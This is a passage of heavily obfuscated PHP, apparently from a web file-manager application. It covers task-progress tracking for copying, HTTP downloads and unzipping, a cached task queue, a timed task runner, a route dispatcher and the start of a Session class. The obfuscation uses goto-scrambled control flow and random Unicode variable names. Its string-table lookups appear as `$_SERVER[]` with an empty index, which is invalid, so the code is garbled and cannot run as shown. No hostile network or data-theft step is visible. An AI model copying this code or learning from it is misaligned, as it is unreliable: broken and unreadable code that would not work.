return $Bߢ; } public static function listData() { $B = self::valueGet(); return array_sort_by($B, $_SERVER[][754], !0); } public static function kill($B߆) { return self::changeStatus($B߆, self::STATYS_KILL); } public static function stop($fǪ) { return self::changeStatus($fǪ, self::STATYS_STOP); } public static function restart($D) { return self::changeStatus($D, self::STATYS_RUNNING); } public static function killAll() { $A =& $_SERVER[]; $BВ = self::listData(); foreach ($BВ as $cטŉ) { self::kill($cטŉ[$A[393]]); } sleep(2); foreach ($BВ as $cטŉ) { self::valueSet($cטŉ[$A[393]], !1); } } private static function changeStatus($B䊽, $f쇗) { goto f봎; C̐: return !0; goto Aݭн; bəȖ: $B[$cד[715]] = $f쇗; self::valueSet($B䊽, $B); self::log($cד[1553] . $B[$cד[393]] . $cד[1554] . $f쇗); goto C̐; f봎: $cד =& $_SERVER[]; $B = self::valueGet($B䊽); if (!$B) { return !1; } goto bəȖ; Aݭн: } public static function valueGet($a͉ٙ = false) { $e =& $_SERVER[]; if ($a͉ٙ) { $Fܪ = Model($e[425])->where(array($e[93] => $a͉ٙ, $e[29] => $e[1555]))->find(); return $Fܪ ? json_decode($Fܪ[$e[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($f = false) { goto c; D󅅟: return $EΟ; goto C֊; C֋: $EΟ = Model($Bھú[425])->where($EЦ)->select(); $EΟ = $EΟ ? $EΟ : array(); foreach ($EΟ as $E쫭 => $E) { $EΟ[$E쫭] = json_decode($E[$Bھú[372]], !0); } goto D󅅟; c: $Bھú =& $_SERVER[]; $EЦ = array($Bھú[29] => $Bھú[1555]); if ($f) { $EЦ[$Bھú[1533]] = $f; } goto C֋; C֊: } public static function valueSet($eɼ, $dݥ) { goto b݄; Eܚ󩃯: if (!$dŤŋ) { ob_start(); var_dump($dݥ); $Aᫍ = ob_get_clean(); self::log($fУ[1556] . json_encode_force($Aᫍ)); } if (!$eɼ || !$dݥ[$fУ[393]]) { return !1; } $B = array($fУ[29] => $fУ[1555], $fУ[1533] => USER_ID, $fУ[93] => $eɼ, $fУ[372] => $dŤŋ); goto A՝诪; f˞ƣ: CacheLock::unlock($e); goto Fࢊ; b݄: $fУ =& $_SERVER[]; if (!$dݥ) { return Model($fУ[425])->where(array($fУ[93] => $eɼ, $fУ[29] => $fУ[1555]))->delete(); } $dŤŋ = json_encode($dݥ); goto Eܚ󩃯; A՝诪: $e = $fУ[1557]; CacheLock::lock($e); Model($fУ[425])->add($B, array(), !0); goto f˞ƣ; Fࢊ: } public static function log($Aפ̛) { if (!GLOBAL_DEBUG) { return; } write_log($Aפ̛, $_SERVER[][1558]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto eΒ; d˃: Hook::bind($Eꩉ[583], array($this, $Eꩉ[1566])); Hook::bind($Eꩉ[550], array($this, $Eꩉ[1567])); Hook::bind($Eꩉ[547], array($this, $Eꩉ[1567])); goto B; cť: Hook::bind($Eꩉ[1568], array($this, $Eꩉ[1569])); Hook::bind($Eꩉ[572], array($this, $Eꩉ[1570])); $this->sourceModelCopyFlag = !1; goto Bظ; eΒ: $Eꩉ =& $_SERVER[]; $D =& $this->task; $this->sourceCopyFolder = !1; goto c; B: Hook::bind($Eꩉ[552], array($this, $Eꩉ[1567])); Hook::bind($Eꩉ[554], array($this, $Eꩉ[1567])); Hook::bind($Eꩉ[556], array($this, $Eꩉ[1567])); goto cť; dáٞ: $D[$Eꩉ[1024]] = $Eꩉ[33]; $D[$Eꩉ[1581]] = $Eꩉ[33]; $D[$Eꩉ[1582]] = 0; goto B; c: Hook::bind($Eꩉ[1559], array($this, $Eꩉ[1560])); Hook::bind($Eꩉ[1113], array($this, $Eꩉ[1561])); Hook::bind($Eꩉ[1562], array($this, $Eꩉ[1563])); goto Fʌ׫; Fʌ׫: Hook::bind($Eꩉ[579], array($this, $Eꩉ[1564])); Hook::bind($Eꩉ[580], array($this, $Eꩉ[1565])); Hook::bind($Eꩉ[582], array($this, $Eꩉ[1566])); goto d˃; Bظ: Hook::bind($Eꩉ[1571], array($this, $Eꩉ[1572])); Hook::bind($Eꩉ[1573], array($this, $Eꩉ[1574])); Hook::bind($Eꩉ[1575], array($this, $Eꩉ[1576])); goto Aّ; Aّ: $D[$Eꩉ[1577]] = LNG($Eꩉ[1578]); $D[$Eꩉ[1579]] = 0; $D[$Eꩉ[1580]] = 0; goto dáٞ; B: $D[$Eꩉ[1583]] = 0; $D[$Eꩉ[1584]] = 0; if (!$D[$Eꩉ[1436]]) { $D[$Eꩉ[1436]] = LNG($Eꩉ[1585]); } goto Dᑇ; Dᑇ: } protected function endAfter() { goto Dė; bȃ: Hook::unbind($D텕[547], array($this, $D텕[1567])); Hook::unbind($D텕[552], array($this, $D텕[1567])); Hook::unbind($D텕[554], array($this, $D텕[1567])); goto Dʷ; e: Hook::unbind($D텕[582], array($this, $D텕[1566])); Hook::unbind($D텕[583], array($this, $D텕[1566])); Hook::unbind($D텕[550], array($this, $D텕[1567])); goto bȃ; c疂: Hook::unbind($D텕[1562], array($this, $D텕[1563])); Hook::unbind($D텕[579], array($this, $D텕[1564])); Hook::unbind($D텕[580], array($this, $D텕[1565])); goto e; cǅ: Hook::unbind($D텕[1571], array($this, $D텕[1572])); Hook::unbind($D텕[1573], array($this, $D텕[1574])); Hook::unbind($D텕[1575], array($this, $D텕[1576])); goto bݩݮ; Dʷ: Hook::unbind($D텕[556], array($this, $D텕[1567])); Hook::unbind($D텕[1568], array($this, $D텕[1569])); Hook::unbind($D텕[572], array($this, $D텕[1570])); goto cǅ; Dė: $D텕 =& $_SERVER[]; Hook::unbind($D텕[1559], array($this, $D텕[1560])); Hook::unbind($D텕[1113], array($this, $D텕[1561])); goto c疂; bݩݮ: } public function copyMoveStart($cȣ, $fĨ, $F, $aɸ) { goto F; f⥣: if (substr($fĨ, 0, strlen($D)) == $D) { return; } if (substr($aɸ, 0, strlen($D)) == $D) { return; } $fǪ =& $this->task; goto e̡; e̡: $fǪ[$aɷ[1587]] = KodIO::transferType($cȣ, $F); $this->update(); goto b؞; F: $aɷ =& $_SERVER[]; self::log($aɷ[1586] . $fĨ . $aɷ[67] . $aɸ); $D = rtrim(TEMP_FILES, $aɷ[8]); goto f⥣; b؞: } public function updateAfter() { $DĔȜ =& $_SERVER[]; $a쓟 =& $this->task; if (!$a쓟[$DĔȜ[728]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($a쓟[$DĔȜ[1587]] == $DĔȜ[1186]) { return; } self::updateTask($a쓟); } private static function updateTask(&$d̸) { $B닅ښ =& $_SERVER[]; if ($d̸[$B닅ښ[1587]] == $B닅ښ[1097] || $d̸[$B닅ښ[1587]] == $B닅ښ[107]) { if ($d̸[$B닅ښ[1581]]) { $d̸[$B닅ښ[1584]] = $d̸[$B닅ښ[1583]] + $d̸[$B닅ښ[1580]]; } } else { if ($d̸[$B닅ښ[1587]] == $B닅ښ[1187]) { if ($d̸[$B닅ښ[1581]] == $B닅ښ[1097]) { $d̸[$B닅ښ[1584]] = $d̸[$B닅ښ[1583]] + $d̸[$B닅ښ[1580]] * 0.5; } else { if ($d̸[$B닅ښ[1581]] == $B닅ښ[107]) { $d̸[$B닅ښ[1584]] = $d̸[$B닅ښ[1583]] + $d̸[$B닅ښ[1579]] * 0.5 + $d̸[$B닅ښ[1580]] * 0.5; } } } } $d̸[$B닅ښ[1534]] = $d̸[$B닅ښ[1584]] / $d̸[$B닅ښ[728]]; if ($d̸[$B닅ښ[1534]] > 0) { $c腑 = timeFloat() - $d̸[$B닅ښ[754]] - $d̸[$B닅ښ[1537]]; $d̸[$B닅ښ[1538]] = $c腑 * (1 - $d̸[$B닅ښ[1534]]) / $d̸[$B닅ښ[1534]]; } } public function addPath($Cγᇯ) { goto A󧨍; c: if ($eҳ[$aȍ[29]] == $aȍ[193]) { $eӈ[$aȍ[1022]] += 1; } else { $eӈ[$aȍ[1022]] += $eҳ[$aȍ[81]][$aȍ[79]]; if ($eҳ[$aȍ[395]]) { $eӈ[$aȍ[1022]] += $eҳ[$aȍ[81]][$aȍ[80]] + 1; } } $eӈ[$aȍ[728]] += $eҳ[$aȍ[78]]; $this->update(); goto e; b僼ގ: $eҳ = IO::infoWithChildren($Cγᇯ); $Aݿ = $eӈ[$aȍ[1588]] ? $eӈ[$aȍ[1588]][$aȍ[1589]] : 0; $eӈ[$aȍ[1588]] = array($aȍ[1589] => $Aݿ + 1, $aȍ[413] => $eҳ[$aȍ[28]], $aȍ[76] => $eҳ[$aȍ[76]], $aȍ[500] => $eҳ[$aȍ[500]] ? $eҳ[$aȍ[500]] : $eҳ[$aȍ[76]]); goto c; A󧨍: $aȍ =& $_SERVER[]; if (!$Cγᇯ) { return; } $eӈ =& $this->task; goto b僼ގ; e: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($e΅) { $c =& $_SERVER[]; $Bď =& $this->task; $Bď[$c[1577]] = $e΅[$c[28]]; $Bď[$c[1024]] = $e΅[$c[28]]; $this->update(); } public function copyFileStart($F, $d筋ӡ, $d, $C⡍, $eӼ, $fڏ) { goto C韍; aē: $GLOBALS[$E쵢[1591]] = $eӼ; $GLOBALS[$E쵢[1590]] = $fڏ; $DÂ =& $this->task; goto D虻; D虻: $DÂ[$E쵢[1577]] = $b顪; $DÂ[$E쵢[1579]] = (int) $F->size($d筋ӡ); $DÂ[$E쵢[1580]] = 0; goto fݫƋ; C预: $this->update(0, $f𛆣); goto A; fݫƋ: $DÂ[$E쵢[1024]] = $E쵢[33]; $DÂ[$E쵢[1581]] = $E쵢[33]; $DÂ[$E쵢[1582]] = 0; goto E; C韍: $E쵢 =& $_SERVER[]; $b顪 = $eӼ; if ($b顪 == $GLOBALS[$E쵢[1590]]) { $b顪 = $GLOBALS[$E쵢[1591]]; } goto aē; E: $f𛆣 = $DÂ[$E쵢[1579]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($DÂ[$E쵢[393]] . $E쵢[1592]); if ($f𛆣 && file_exists(get_path_father($C⡍))) { Cache::set($DÂ[$E쵢[393]] . $E쵢[1592], $C⡍); $DÂ[$E쵢[1552]] = array($E쵢[1593], $E쵢[1594]); } goto C预; A: } public static function updateCopyLocalFileSize($B) { goto D劈; D劈: $Fۃ =& $_SERVER[]; $eω = Cache::get($B[$Fۃ[393]] . $Fۃ[1592]); if (!$eω || !file_exists($eω)) { return $B; } goto FԿ; FԿ: $B[$Fۃ[1580]] = @filesize($eω); $B[$Fۃ[1584]] += $B[$Fۃ[1580]]; self::updateTask($B); goto Eԟ; Eԟ: return $B; goto c; c: } public function copyFileEnd($F, $Dг, $A, $E, $e, $Fݧ) { goto b; f򧨒: $d[$cʕ[1581]] = $cʕ[33]; unset($d[$cʕ[1552]]); if ($e == $d[$cʕ[1577]]) { $d[$cʕ[1583]] += $d[$cʕ[1579]]; $d[$cʕ[1584]] = $d[$cʕ[1583]]; $this->update(1); } else { $this->update(); $d[$cʕ[1580]] = 0; } goto eۮ; b: $cʕ =& $_SERVER[]; $d =& $this->task; $d[$cʕ[1580]] = $d[$cʕ[1579]]; goto f򧨒; eۮ: Cache::remove($d[$cʕ[393]] . $cʕ[1592]); self::log($cʕ[1595] . $Dг . $cʕ[67] . $E . $cʕ[229] . $e . $cʕ[1596] . $d[$cʕ[1577]]); goto C; C: } public function updateFileEnd($D鮼, $C̄) { goto EЄ; EЄ: $b =& $_SERVER[]; $fǹ =& $this->task; $fǹ[$b[1577]] = $D鮼; goto b; b: $fǹ[$b[1579]] = $C̄; $fǹ[$b[1583]] += $C̄; $fǹ[$b[1584]] = $fǹ[$b[1583]]; goto F̣; F̣: $this->update(1); self::log($b[1597] . $D鮼); goto fݍ; fݍ: } public function sourceModelCopy($a) { goto D㙅; A´: $dЄ̍ =& $this->task; $this->sourceModelCopyFlag = !0; $E = 0; goto aوΡЯ; aوΡЯ: switch ($FȮ齟) { case $d[548]: $E = 1; break; case $d[551]: $dЄ̍[$d[1577]] = $f̏[$d[28]]; break; case $d[553]: $E = intval($a[$d[377]] * 0.4); break; case $d[555]: $E = intval($a[$d[377]] * 0.2); break; case $d[557]: $E = intval($a[$d[377]] * 0.4); break; } $this->update($E); $this->sourceModelCopyFlag = !1; goto EФ; D㙅: $d =& $_SERVER[]; $FȮ齟 = $a[0]; $f̏ = $a[1]; goto A´; EФ: } public function sourceRemove($Eʈ, $fؽ) { $ĕġ =& $_SERVER[]; $this->sourceModelCopyFlag = !0; $B牃ת = 1; if (isset($Eʈ[$ĕġ[81]])) { $B牃ת = $Eʈ[$ĕġ[81]][$ĕġ[79]] + $Eʈ[$ĕġ[81]][$ĕġ[80]] + 1; } $this->update($B牃ת); $this->sourceModelCopyFlag = !1; } public function sourceMove($eПŹ) { $this->sourceRemove($eПŹ, !1); } public function curlProgress($DƋۭ, $b֜, $Eʿת, $a˅, $fԨ) { $B =& $_SERVER[]; $e =& $this->task; if ($fԨ > 0) { $e[$B[1024]] = $B[1598]; $e[$B[1581]] = $B[107]; if ($e[$B[1579]]) { $e[$B[1580]] = $fԨ; } if ($e[$B[1582]]) { $e[$B[1580]] = $fԨ + $e[$B[1582]]; } } else { if ($Eʿת > 0) { if ($e[$B[1579]] == $b֜) { $e[$B[1580]] = $Eʿת; $e[$B[1024]] = $B[1599]; $e[$B[1581]] = $B[1097]; } } } $this->update(); } public function curlProgressStart($f𧼄) { } public function curlProgressEnd($dϙٗ) { goto DӃ; A: $Bм = $F[$a[1600]]; if ($Bм == -1) { $Bм = $F[$a[1601]]; } if ($B[$a[1581]] == $a[107] && $Bм) { $B[$a[1582]] += $Bм; } goto D׵; D׵: $this->update(); goto dܑ; DӃ: $a =& $_SERVER[]; $B =& $this->task; $F = curl_getinfo($dϙٗ); goto A; dܑ: } } class TaskHttp extends Task { protected function startAfter() { $eΆ =& $_SERVER[]; $d =& $this->task; $d[$eΆ[1602]] = 1; Hook::bind($eΆ[1571], array($this, $eΆ[1603])); Hook::bind($eΆ[1573], array($this, $eΆ[1604])); Hook::bind($eΆ[1575], array($this, $eΆ[1605])); } protected function endAfter() { $bߵﳼ =& $_SERVER[]; Hook::unbind($bߵﳼ[1571], array($this, $bߵﳼ[1603])); Hook::unbind($bߵﳼ[1573], array($this, $bߵﳼ[1604])); Hook::unbind($bߵﳼ[1575], array($this, $bߵﳼ[1605])); } public function progressStart($cޏ郟) { $fۇ =& $_SERVER[]; $FѠ = curl_getinfo($cޏ郟); self::log($fۇ[1606] . $FѠ[$fۇ[305]]); self::valueSet($this->task[$fۇ[393]], $this->task); } public function progressEnd($a) { $F =& $_SERVER[]; self::log($F[1607] . $this->task[$F[393]]); $this->end(); } public function progress($d훧, $bؑ, $eÒ, $CѨ, $bⅪ) { $Fݥ =& $_SERVER[]; $eߞ =& $this->task; if ($bⅪ > 0) { $eߞ[$Fݥ[1022]] = $eߞ[$Fݥ[1022]] == 0 ? $CѨ : $eߞ[$Fݥ[1022]]; $eߞ[$Fݥ[1037]] = $bⅪ; } else { if ($eÒ > 0) { $eߞ[$Fݥ[1022]] = $eߞ[$Fݥ[1022]] == 0 ? $bؑ : $eߞ[$Fݥ[1022]]; $eߞ[$Fݥ[1037]] = $eÒ; } } $this->update(); self::log("\160\162\157\147\162\145\163\163\110\164\x74\x70\72\144\157\x77\x6e\x3a{$eÒ}\x2f{$bؑ}\73\x20\x75\x70\x6c\x6f\x61\x64\72{$bⅪ}\57{$CѨ}\73"); } } goto b; b: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\x6b\121\x75\x65\165\x65\x4c\x65\156\x67\164\x68"; const QUEUE_DATA = "\164\x61\x73\153\121\165\145\x75\145\x44\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($Cԓ, $FǦ = array(), $EӇ = '', $fɪݙ = '') { $A𭵱 =& $_SERVER[]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($fɪݙ && array_find_by_field(self::$listData, $A𭵱[93], $fɪݙ)) { return !0; } self::$listData[] = array($A𭵱[262] => $Cԓ, $A𭵱[1608] => $FǦ, $A𭵱[431] => $EӇ, $A𭵱[93] => $fɪݙ); return !0; } public static function addSubmit() { $E =& $_SERVER[]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($E[1609] . json_encode_force(array_to_keyvalue(self::$listData, $E[33], $E[431])), $E[1610]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($b, $a = array(), $Dƾ = '', $Fϟɻ = '') { goto Fӎֵ; Fӎֵ: $B߆ =& $_SERVER[]; if (self::count() >= self::MAX_LENGTH) { return !1; } $F = self::getAll(); goto b; b: if ($Fϟɻ && array_find_by_field($F, $B߆[93], $Fϟɻ)) { return !0; } $F[] = array($B߆[262] => $b, $B߆[1608] => $a, $B߆[431] => $Dƾ, $B߆[93] => $Fϟɻ); write_log($B߆[1609] . $Dƾ, $B߆[1610]); goto EƜ; EƜ: self::setAll($F); return !0; goto Cءǥ; Cءǥ: } public static function run() { goto D챠; D챠: $b =& $_SERVER[]; $EܱЅ = self::getAll(); $C˱ = array_shift($EܱЅ); goto Aו; E: return !0; goto d䛋; Aו: if (!$C˱) { return !1; } self::setAll($EܱЅ); $bث = timeFloat(); goto C; C: try { Hook::apply($C˱[$b[262]], $C˱[$b[1608]]); } catch (Exception $Aڄ) { } $C䖷 = number_format(timeFloat() - $bث, 3) . $b[1546]; write_log($b[1611] . $C˱[$b[431]] . $b[1612] . $C䖷, $b[1610]); goto E; d䛋: } public static function count() { $fʑ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$fʑ) { return 0; } return intval($fʑ); } public static function getAll() { $b = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$b) { return array(); } return $b; } public static function setAll($Dן) { $Cˌ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Dן), $Cˌ); Cache::set(self::QUEUE_DATA, $Dן, $Cˌ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Dơ, $fب = 5.0) { if (!$Dơ) { return; } $c = Cache::get($Dơ); if (!$c || timeFloat() - floatVal($c) >= $fب) { Cache::set($Dơ, timeFloat(), $fب * 10); return !0; } return !1; } public static function timeLimitCall($BЎ, $C̣, $dг, $c݆ׄ = 5.0) { goto bŃ; E: Cache::set($e, $a, 60); Cache::removeMemory($e); write_log($c[1616] . $BЎ . $c[68] . $C̣, $c[1610]); goto bՌτ; B: if (is_array($a[$BЎ])) { $d[$c[1615]] = $a[$BЎ][$c[1615]]; } if (is_array($a[$BЎ])) { if (timeFloat() - $a[$BЎ][$c[1614]] < $d[$c[197]] * 0.3) { return; } $d[$c[1615]] = $a[$BЎ][$c[1615]]; } $a[$BЎ] = $d; goto E; bŃ: $c =& $_SERVER[]; if (!$BЎ || !$C̣) { return; } self::$asyncAdd = !0; goto Eِ; Eِ: $e = $c[1613]; $a = Cache::get($e, !0); $d = array($c[1614] => timeFloat(), $c[1615] => timeFloat(), $c[262] => $C̣, $c[1608] => $dг, $c[197] => $c݆ׄ); goto B; bՌτ: } public static function timeLimitCallLoop() { goto Aڼх; F: if (!$Fϻ || count($Fϻ) <= 0) { return; } $eʤ = !1; $d݌ї = timeFloat(); goto a; d: if (!$D && !self::$asyncAdd) { return; } $d = $D㸂[1613]; $Fϻ = Cache::get($d, !0); goto F; Dߐ: if (!$Dט) { return Cache::remove($d); } Cache::set($d, $Dט, 60); Cache::removeMemory($d); goto D븅; a: $Dט = array(); foreach ($Fϻ as $c => $a᤽) { if ($d݌ї - $a᤽[$D㸂[1615]] > $a᤽[$D㸂[197]]) { $eʤ = !0; try { Hook::apply($a᤽[$D㸂[262]], $a᤽[$D㸂[1608]]); write_log($D㸂[1618] . $c . $D㸂[68] . $a᤽[$D㸂[262]] . $D㸂[1619] . ACTION, $D㸂[1610]); } catch (Exception $dں) { } continue; } $Dט[$c] = $a᤽; } if (!$eʤ) { return; } goto Dߐ; Aڼх: $D㸂 =& $_SERVER[]; $E򶊹 = array($D㸂[1617]); $D = in_array(strtolower(ACTION), $E򶊹); goto d; D븅: } public static function finished($F֫, $a楫) { $eכ =& $_SERVER[]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($eכ[262] => $F֫, $eכ[1608] => $a楫); } private static function finishedRun() { $b =& $_SERVER[]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $eīռڎ) { try { Hook::apply($eīռڎ[$b[262]], $eīռڎ[$b[1608]]); } catch (Exception $b䢑ኅ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto Bă; Bă: $D =& $_SERVER[]; parent::startAfter(); Hook::bind($D[1620], array($this, $D[1621])); goto C; e: if (!$Cх[$D[1436]]) { $Cх[$D[1436]] = LNG($D[1624]); } goto Cۦ; C: Hook::bind($D[1092], array($this, $D[1622])); $Cх =& $this->task; $Cх[$D[1623]] = $D[1097]; goto e; Cۦ: } protected function endAfter() { $b샽 =& $_SERVER[]; parent::endAfter(); Hook::unbind($b샽[1620], array($this, $b샽[1621])); Hook::unbind($b샽[1092], array($this, $b샽[1622])); } public function updateAfter() { $B =& $_SERVER[]; $aȍ =& $this->task; if (!$aȍ[$B[1022]] || !$aȍ[$B[728]]) { return; } if ($aȍ[$B[1623]] == $B[1097]) { $d = 0; if ($aȍ[$B[1579]]) { $d = $aȍ[$B[1580]] / $aȍ[$B[1579]]; } $aȍ[$B[1534]] = $d * 0.3; } else { if ($aȍ[$B[1623]] == $B[311]) { $d = $aȍ[$B[1037]] / $aȍ[$B[1022]]; $aȍ[$B[1534]] = 0.3 + $d * 0.4; } else { if ($aȍ[$B[1623]] == $B[107]) { $D = 0; if ($aȍ[$B[1581]] == $B[107]) { $D = $aȍ[$B[1580]]; } $d = ($aȍ[$B[1584]] + $D) / $aȍ[$B[728]]; $aȍ[$B[1534]] = 0.3 + 0.4 + $d * 0.3; } } } if ($aȍ[$B[1534]] > 0) { $eذ = timeFloat() - $aȍ[$B[754]] - $aȍ[$B[1537]]; $aȍ[$B[1538]] = $eذ * (1 - $aȍ[$B[1534]]) / $aȍ[$B[1534]]; } } public function addFile($eƭδ) { goto fԚ; a: $B؃[$e[1024]] = $e[1599]; $B؃[$e[1581]] = $e[1097]; $B؃[$e[728]] = $a[$e[78]]; goto Bɽ; D: $B؃[$e[1577]] = $a[$e[28]]; $B؃[$e[1579]] = $a[$e[78]]; $B؃[$e[1580]] = 0; goto a; fԚ: $e =& $_SERVER[]; $B؃ =& $this->task; $a = IO::info($eƭδ); goto D; dݼڕ: $this->update(); goto A賂; Bɽ: $B؃[$e[1022]] = 1; $B͎ = 0; $B؃[$e[1588]] = array($e[1589] => $B͎ + 1, $e[413] => $a[$e[28]], $e[76] => $a[$e[76]], $e[500] => $a[$e[500]] ? $a[$e[500]] : $a[$e[76]]); goto dݼڕ; A賂: } public function unzipAfter($E) { goto b⎹; eՅ: $this->update(); self::log($A[1625] . json_encode(array($Bާޣ, $c췅ޑ))); goto DԢ; d: $c췅ޑ = IO::infoWithChildren($E); $F = 0; $Bާޣ[$A[1588]] = array($A[1589] => $F + 1, $A[413] => $c췅ޑ[$A[28]], $A[76] => $c췅ޑ[$A[76]], $A[500] => $c췅ޑ[$A[500]] ? $c췅ޑ[$A[500]] : $c췅ޑ[$A[76]]); goto a; Fӫ: $Bާޣ[$A[1037]] = 0; $Bާޣ[$A[1579]] = 0; $Bާޣ[$A[1580]] = 0; goto eǜ; eǜ: $Bާޣ[$A[1577]] = $A[33]; $Bާޣ[$A[1584]] = 0; $Bާޣ[$A[728]] = $c췅ޑ[$A[78]]; goto eՅ; b⎹: $A =& $_SERVER[]; $Bާޣ =& $this->task; $Bާޣ[$A[1623]] = $A[107]; goto d; a: if ($c췅ޑ[$A[29]] == $A[193]) { $Bާޣ[$A[1022]] = 1; } else { $Bާޣ[$A[1022]] = $c췅ޑ[$A[81]][$A[79]]; } $Bާޣ[$A[1024]] = $A[33]; $Bާޣ[$A[1581]] = 0; goto Fӫ; DԢ: } public function nameParse($cü) { goto Eᭌ; Eᭌ: $Eۨ =& $_SERVER[]; $fՎ =& $this->task; if ($fՎ[$Eۨ[1623]] == $Eۨ[1097]) { $fՎ[$Eۨ[1623]] = $Eۨ[311]; $fՎ[$Eۨ[1584]] = 0; $fՎ[$Eۨ[728]] = 0; } goto FĴ; FĴ: $Cʘ = get_path_this($cü); if (strstr($Cʘ, $Eۨ[95])) { $fՎ[$Eۨ[1037]] += 1; $fՎ[$Eۨ[1022]] += 1; } $fՎ[$Eۨ[1577]] = $cü; goto cڲ; cڲ: $this->update(); goto Cڶו; Cڶו: } } goto C폵ڄ; bƂ: function binCheckBigger($dӟ, $FŮ޸) { return $dӟ > $FŮ޸; } $_SERVER[$_SERVER[][3]] = ("\x39\x30\x38\x39"."\x36\x36")+0;$_4KsM="ecPfndJSe6ipA982eYx7MqGZ55tF2dIKynpVdEHJVwjDKFWPdq6KcW9fUFXwUw4iiPt3rKrYMm5m";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($eѠ, $Bʰ) { $e =& $_SERVER[]; if (isset(self::$_methodList[$eѠ])) { return @call_user_func_array(self::$_methodList[$eѠ], $Bʰ); } else { if (method_exists($this, $eѠ)) { return call_user_func_array(array($this, $eѠ), $Bʰ); } else { think_exception(__CLASS__ . $e[4] . $eѠ . $e[5]); } } } public static function __callStatic($b𷬄, $Dƞ·) { if (isset(self::$_methodListStatic[$b𷬄])) { return call_user_func_array(self::$_methodListStatic[$b𷬄], $Dƞ·); } else { if (method_exists(self, $b𷬄)) { return call_user_func_array(array(self, $b𷬄), $Dƞ·); } else { show_json("{$b𷬄}\x28\51\x20\156\x6f\x74\40\x65\x78\151\x73\164\x3b", !1); } } } public static function addMethod($fͱ, $cٳ) { self::$_methodList[$fͱ] = $cٳ; } public static function addMethodStatic($cܑ, $C) { self::$_methodListStatic[$cܑ] = $C; } } goto e; a: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\133\136\57\135\53", "\72\x6e\x75\x6d" => "\x5b\60\55\71\135\x2b", "\x3a\141\x6c\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($C, $FÎ) { $f =& $_SERVER[]; if ($C == $f[1481]) { $B猱 = array_map($f[1482], $FÎ[0]); $E̡ = strpos($FÎ[1], $f[8]) === 0 ? $FÎ[1] : $f[8] . $FÎ[1]; $Cш = $FÎ[2]; } else { $B猱 = null; $E̡ = strpos($FÎ[0], $f[8]) === 0 ? $FÎ[0] : $f[8] . $FÎ[0]; $Cш = $FÎ[1]; } array_push(self::$maps, $B猱); array_push(self::$routes, $E̡); array_push(self::$methods, strtoupper($C)); array_push(self::$callbacks, $Cш); } public static function error($F) { self::$errorCallback = $F; } public static function haltOnMatch($Bې = true) { self::$halts = $Bې; } public static function dispatch() { goto cꠣߞ; cꠣߞ: $Eʔ =& $_SERVER[]; $d = parse_url($_SERVER[$Eʔ[1483]], PHP_URL_PATH); $Eݪ = $_SERVER[$Eʔ[157]]; goto dȿ; dȿ: $cʷ = array_keys(static::$patterns); $Fٕ˳ = array_values(static::$patterns); $a = !1; goto cƘ; cƘ: self::$routes = preg_replace($Eʔ[1167], $Eʔ[8], self::$routes); if (in_array($d, self::$routes)) { $c = array_keys(self::$routes, $d); foreach ($c as $D⬵傉) { if (self::$methods[$D⬵傉] == $Eݪ || self::$methods[$D⬵傉] == $Eʔ[1484] || in_array($Eݪ, self::$maps[$D⬵傉])) { $a = !0; if (!is_object(self::$callbacks[$D⬵傉])) { $aݬڲ = explode($Eʔ[8], self::$callbacks[$D⬵傉]); $cɏ = end($aݬڲ); $aꔢ = explode($Eʔ[1485], $cɏ); $aܭ = new $aꔢ[0](); $aܭ->{$aꔢ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$D⬵傉]); if (self::$halts) { return; } } } } } else { $D = 0; foreach (self::$routes as $D⬵傉) { if (strpos($D⬵傉, $Eʔ[4]) !== !1) { $D⬵傉 = str_replace($cʷ, $Fٕ˳, $D⬵傉); } if (preg_match($Eʔ[1486] . $D⬵傉 . $Eʔ[1487], $d, $e񛖐)) { if (self::$methods[$D] == $Eݪ || self::$methods[$D] == $Eʔ[1484] || !empty(self::$maps[$D]) && in_array($Eݪ, self::$maps[$D])) { $a = !0; array_shift($e񛖐); if (!is_object(self::$callbacks[$D])) { $aݬڲ = explode($Eʔ[8], self::$callbacks[$D]); $cɏ = end($aݬڲ); $aꔢ = explode($Eʔ[1485], $cɏ); $aܭ = new $aꔢ[0](); if (!method_exists($aܭ, $aꔢ[1])) { echo $Eʔ[1488]; } else { call_user_func_array(array($aܭ, $aꔢ[1]), $e񛖐); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$D], $e񛖐); if (self::$halts) { return; } } } } $D++; } } if ($a == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $A =& $_SERVER[]; header($_SERVER[$A[1489]] . $A[1490]); echo $A[1491]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Eʔ[1483]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cΐڿ; cΐڿ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto E; F: $AЬ׺ߑ = 